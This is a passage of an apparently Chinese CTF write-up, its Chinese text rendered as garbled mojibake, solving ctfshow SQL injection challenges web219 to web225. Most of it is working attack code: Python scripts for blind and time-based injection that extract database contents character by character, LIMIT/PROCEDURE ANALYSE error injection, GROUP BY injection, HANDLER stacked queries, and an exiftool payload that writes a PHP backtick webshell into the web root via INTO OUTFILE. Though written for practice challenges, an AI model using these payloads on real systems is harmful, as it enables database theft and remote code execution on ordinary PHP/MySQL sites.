punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token comment"># ctfshow&#123;f470e6gb-3856-42D3-ae55-402e84412f0P&#125;</span><span class="token comment"># ctfshow&#123;f47hc6hb-3856-4293-ae55-402e84412f04&#125;</span><span class="token comment"># ctfshow&#123;f470c7dh-3856-4293-ae55-402e84412f04&#125;</span><span class="token comment"># ctfshow&#123;f470c6db-3856-4293-ae55-402e84412f04&#125; ‚àö</span></code></pre><h4 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h4><p>Â§öÂ±èËîΩ‰∫Ü‰∏Ä‰∏™rlikeÔºà‰πüÊòØÂª∂Êó∂ÁöÑ‰∏ÄÁßçÊñπÊ≥ïÔºâ ‰∏ä‰∏ÄÈ¢òËÑöÊú¨‰æùÊóßÂèØ‰ª•</p><h4 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h4><p>ËøáÊª§‰∫Üsubstr ÈÇ£Â∞±‰ΩøÁî®leftÂç≥ÂèØ Âπ∂‰∏îËøáÊª§‰∫Üconcat ÂØºËá¥Êàë‰ª¨group_concat ‰∏ç ËÉΩ‰ΩøÁî® ‰ΩÜÊòØÂèØ‰ª•ÊòØÁî®limit ÈÄêË°åËé∑Âèñ</p><p><strong>limit N,M</strong> : Áõ∏ÂΩì‰∫é <strong>limit M offset N</strong> , ‰ªéÁ¨¨ N Êù°ËÆ∞ÂΩïÂºÄÂßã, ËøîÂõû M Êù°ËÆ∞ÂΩï</p><p>Âè¶Â§ñascii‰πüË¢´ban‰∫ÜÔºåÊâÄ‰ª•Áõ¥Êé•ÊØîËæÉÂ≠óÁ¨¶‰∏≤</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://83d3e450-cfe1-4e34-9769-2021e662fa03.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>flagdic <span class="token operator">=</span> <span class="token string">"1234567890-_&#123;&#125;qwertyuioplkjhgfdsazxcvbnm, "</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagdic<span class="token punctuation">:</span>        <span class="token comment"># Êü•Â∫ìÂêç</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># Êü•Ë°®Âêç  ctfshow_flagxcac,ctfshow_info</span>        <span class="token comment"># payload = "select table_name from information_schema.tables where table_schema=database() limit 0,1"</span>        <span class="token comment"># Êü•ÂàóÂêç  id,flagaabcc,info</span>        <span class="token comment"># payload = "select column_name from information_schema.columns where table_name='ctfshow_flagxcac' limit 1,1"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaabcc from ctfshow_flagxcac"</span>        tmp <span class="token operator">=</span> flag <span class="token operator">+</span> j        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1) and if(left((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">)='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tmp<span class="token punctuation">&#125;</span></span><span class="token string">',(select count(*) from((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,2)c)),1"</span></span><span class="token punctuation">,</span>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token string">' '</span><span class="token punctuation">:</span>            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h4 id="web221-limitÊ≥®ÂÖ•"><a href="#web221-limitÊ≥®ÂÖ•" class="headerlink" title="web221(limitÊ≥®ÂÖ•)"></a>web221(limitÊ≥®ÂÖ•)</h4><p>Êü•ËØ¢ËØ≠Âè•</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//ÂàÜÈ°µÊü•ËØ¢</span><span class="token variable">$sql</span> <span class="token operator">=</span> select <span class="token operator">*</span> from ctfshow_user <span class="token function">limit</span> <span class="token punctuation">(</span><span class="token variable">$page</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token variable">$limit</span><span class="token punctuation">,</span><span class="token variable">$limit</span><span class="token punctuation">;</span>    </code></pre><p>ËøîÂõûÈÄªËæë</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:ÂæàÂÆâÂÖ®Ôºå‰∏çÈúÄË¶ÅËøáÊª§</span><span class="token comment">//ÊãøÂà∞Êï∞ÊçÆÂ∫ìÂêçÂ≠óÂ∞±ÁÆó‰Ω†Ëµ¢</span>      </code></pre><p>1Ôºâ<strong>limitÂâçÈù¢Ê≤°Êúâorder byÊó∂ÔºåÂêéÈù¢ÂèØ‰ª•Ë∑üunionÔºåÂ¶ÇÊûúÂ≠òÂú®order byÔºåÂàô‰∏çËÉΩ‰ΩøÁî®union„ÄÇ</strong></p><p>2ÔºâlimitÂêéÈù¢‰∏çËÉΩÁõ¥Êé•Ë∑üselectËØ≠Âè•ÂíåifËØ≠Âè•„ÄÇ<strong>ÂèØ‰ª•Ë∑üprocedureËØ≠Âè•ÔºåÂÄºÂæóÊ≥®ÊÑèÁöÑÊòØÂè™ÊúâÂú®5.0.0&lt; MySQL &lt;5.6.6ÁâàÊú¨ÊâçÂèØ‰ª•‰ΩøÁî®ÔºåprocedureÂêéÈù¢ÊîØÊåÅÊä•ÈîôÊ≥®ÂÖ•‰ª•ÂèäÊó∂Èó¥Áõ≤Ê≥®</strong></p><p>3Ôºâlimit ÂÖ≥ÈîÆÂ≠óÂêéÈù¢ËøòÂèØË∑üPROCEDUREÂíå INTO‰∏§‰∏™ÂÖ≥ÈîÆÂ≠óÔºå‰ΩÜÊòØ INTO ÂêéÈù¢ÂÜôÂÖ•Êñá‰ª∂ÈúÄË¶ÅÁü•ÈÅìÁªùÂØπË∑ØÂæÑ‰ª•ÂèäÂÜôÂÖ•shellÁöÑÊùÉÈôêÔºåÂõ†Ê≠§Âà©Áî®ÊØîËæÉÈöæ„ÄÇ</p><p><a href="https://www.docs4dev.com/docs/zh/mysql/5.7/reference/procedure-analyse.html">PROCEDURE ANALYZE</a></p><p><a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">Mysql‰∏ãLimitÊ≥®ÂÖ•ÊñπÊ≥ï</a></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;api&#x2F;?page&#x3D;1&amp;limit&#x3D;1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1)</code></pre><p><img src="web221.png" loading="lazy"></p><h4 id="web222-groupÊ≥®ÂÖ•"><a href="#web222-groupÊ≥®ÂÖ•" class="headerlink" title="web222(groupÊ≥®ÂÖ•)"></a>web222(groupÊ≥®ÂÖ•)</h4><p>Êü•ËØ¢ËØ≠Âè•</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//ÂàÜÈ°µÊü•ËØ¢</span><span class="token variable">$sql</span> <span class="token operator">=</span> select <span class="token operator">*</span> from ctfshow_user group <span class="token class-name type-declaration">by</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    </code></pre><p><a href="https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html#1869274163">group byÊ≥®ÂÖ•ÂéüÁêÜ</a></p><p>Âª∂Êó∂Áõ≤Ê≥®Ôºå‰æãÂ¶Ç</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">group by if(1&#x3D;1,sleep(1),1)</code></pre><blockquote><p>‰ΩÜË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºågroup by‰ºöÂêë‰∏ã‰∏ÄÁõ¥Êü•ËØ¢ÔºåÊï∞ÊçÆÂ∫ìÈáåÊÄªÂÖ±Êúâ21Êù°Êï∞ÊçÆÔºåÂ¶ÇÊûúÊàë‰ª¨ÊòØsleep(0.05)ÂàôÊòØÂÅúÈ°ø1.05Áßí</p></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://cfb15639-dd8d-4146-a2c1-5b6e2e349162.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># Êü•Â∫ìÂêç</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># Êü•Ë°®Âêç  ctfshow_flaga,ctfshow_user</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># Êü•ÂàóÂêç  id,flagaabc,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flaga'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaabc from ctfshow_flaga"</span>        params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"u"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"concat((if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">, sleep(0.05), 2)),1);"</span></span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web223"><a href="#web223" class="headerlink" title="web223"></a>web223</h4><p>group by ‰ΩçÁΩÆÊ≥®ÂÖ•ÔºåÂíå‰∏ä‰∏ÄÈ¢òÂ∑Æ‰∏çÂ§öÔºå‰∏çËøáËøôÊ¨°ÂÜçÂ∞ùËØï‰ºöÂèëÁé∞Á¶ÅÁî®‰∫ÜÊï∞Â≠óÔºåÊîπÁî® true ÊûÑÈÄ†Êï∞Â≠ó„ÄÇ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">generateNum</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token string">'true'</span>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> res    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            res <span class="token operator">+=</span> <span class="token string">"+true"</span>        <span class="token keyword">return</span> resurl <span class="token operator">=</span> <span class="token string">"https://9fb07532-bf0d-4e1c-b4aa-241e19c88933.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># Êü•Â∫ìÂêç</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># Êü•Ë°®Âêç  ctfshow_flagas,ctfshow_user</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># Êü•ÂàóÂêç  id,flagasabc,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagas'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagasabc from ctfshow_flagas"</span>        params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"u"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"(if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>generateNum<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>generateNum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>generateNum<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">, username, 'a'))"</span></span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"userAUTO"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web224-Êñá‰ª∂ÂêçÊ≥®ÂÖ•"><a href="#web224-Êñá‰ª∂ÂêçÊ≥®ÂÖ•" class="headerlink" title="web224(Êñá‰ª∂ÂêçÊ≥®ÂÖ•)"></a>web224(Êñá‰ª∂ÂêçÊ≥®ÂÖ•)</h4><p>Êü•Áúã&#x2F;robots.txtÔºåÂèëÁé∞&#x2F;pwdreset.phpÔºåËøõÂéªÂêéÂèØ‰ª•ÈáçÁΩÆadminÂØÜÁ†ÅÔºåÁÑ∂ÂêéÊòØËøõË°åÊñá‰ª∂‰∏ä‰º†Ôºå‰ΩÜÊòØ‰∏ä‰º†‰ªÄ‰πàÊñá‰ª∂ÈÉΩÊòØÁ±ªÂûãÈîôËØØ</p><p>Êñá‰ª∂ÂêçÊ≥®ÂÖ•Ôºå‰∏ãËΩΩÁæ§ÈáåÁöÑ<code>payload.bin</code>ÔºåÂçÅÂÖ≠ËøõÂà∂ÁöÑÊÑèÊÄùÊòØ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token string backtick-quoted-string">`$_GET[1]?`</span><span class="token operator">></span></span></code></pre><p>ÁÑ∂ÂêéËøõË°åRceÂ∞±Ë°å</p><p><img src="web224.png" loading="lazy"></p><p><strong>upload.php</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Return Code: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br />"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">10</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Êñá‰ª∂ËøáÂ§ß: "</span> <span class="token operator">.</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" Kb&lt;br />"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>      <span class="token keyword">echo</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" already exists. "</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>      <span class="token punctuation">&#123;</span>  <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".zip"</span><span class="token punctuation">;</span>      <span class="token variable">$filetype</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">finfo</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/image|png|bmap|jpg|jpeg|application|text|audio|video/i"</span><span class="token punctuation">,</span><span class="token variable">$filetype</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"file type error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"upload/"</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO file(filename,filepath,filetype) VALUES ('"</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string double-quoted-string">"','"</span><span class="token operator">.</span><span class="token variable">$filepath</span><span class="token operator">.</span><span class="token string double-quoted-string">"','"</span><span class="token operator">.</span><span class="token variable">$filetype</span><span class="token operator">.</span><span class="token string double-quoted-string">"');"</span><span class="token punctuation">;</span>      <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Could not connect: '</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:filelist.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Error: "</span> <span class="token operator">.</span> <span class="token variable">$sql</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token delimiter important">?></span></span></code></pre><p>Êü•ËØ¢ËØ≠Âè•Ôºö</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">$sql &#x3D; &quot;INSERT INTO file(filename,filepath,filetype) VALUES (&#39;&quot;.$filename.&quot;&#39;,&#39;&quot;.$filepath.&quot;&#39;,&#39;&quot;.$filetype.&quot;&#39;);&quot;;</code></pre><p><img src="https://img-blog.csdnimg.cn/2020050915132686.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" loading="lazy"><br>‰∏ÄËà¨ÂÜôÊàê16ËøõÂà∂ÂΩ¢ÂºèÔºåÈÅøÂÖçËØ≠Âè•Êú¨Ë∫´ÁöÑÂçïÂºïÂè∑ÂèåÂºïÂè∑ÂØπÊãºÊé•ÈÄ†ÊàêÂπ≤Êâ∞</p><p><img src="https://img-blog.csdnimg.cn/20200509151345661.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" loading="lazy"><br>Êú¨Âú∞ÊµãËØïÂèëÁé∞ÔºåÂÜôËøõÂéªÁöÑ16ËøõÂà∂‰ºöËá™Âä®Ë¢´ËÆ°ÁÆóÊú∫ËØÜÂà´Âá∫ASCII</p><p>Áî®Âà∞exiftoolÂ∑•ÂÖ∑ÊääËøô‰∏™ËØ≠Âè•ÂÜôÂà∞ÂõæÁâáÂ±ûÊÄßÈáåÈù¢  ËØ≠Ê≥ïÔºö</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">exiftool -overwrite_original -comment&#x3D;&quot;y1ng\&quot;&#39;);select 0x3C3F3D60245F504F53545B305D603B into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&#39;;--+&quot;</code></pre><h4 id="web225-Â†ÜÂè†plus-handler"><a href="#web225-Â†ÜÂè†plus-handler" class="headerlink" title="web225(Â†ÜÂè†plus handler)"></a>web225(Â†ÜÂè†plus handler)</h4><p>Êü•ËØ¢ËØ≠Âè•</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//ÂàÜÈ°µÊü•ËØ¢</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where username = '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">;</span>    </code></pre><p>ËøîÂõûÈÄªËæë</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//Â∏àÂÇÖËØ¥ËøáÊª§ÁöÑË∂äÂ§öË∂äÂ•Ω</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i'</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    </code></pre><p><strong>handler</strong></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">?username&#x3D;ctfshow&#39;;show tables;?username&#x3D;ctfshow&#39;;handler &#96;ctfshow_flagasa&#96; open;handler &#96;ctfshow_flagasa&#96; read 